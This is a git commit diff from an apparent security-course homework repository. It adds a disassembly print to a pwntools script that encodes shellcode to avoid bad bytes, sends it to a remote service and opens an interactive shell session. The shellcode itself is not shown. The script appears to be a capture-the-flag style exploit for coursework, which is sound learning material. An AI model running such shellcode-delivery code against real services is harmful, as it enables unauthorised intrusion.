fd99cd694729783690486ae241305ecaab382d9f
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-09-26 17:32:44 +0800

    Reorganize and rename data

--- Hw0x00/shellcode/solve_shellc0de.py
+++ Hw0x00/shellcode/solve_shellc0de.py
@@ -9,6 +9,7 @@ avoid = '\x00\x05\x0f'
 encoded = pwnlib.encoders.encoder.encode(shellcode, avoid, force = 1)
 print('shellcode is ', shellcode)
 print('encoded is ', encoded)
+print(disasm(encoded))
 
 rem.sendline(encoded)
 rem.interactive()
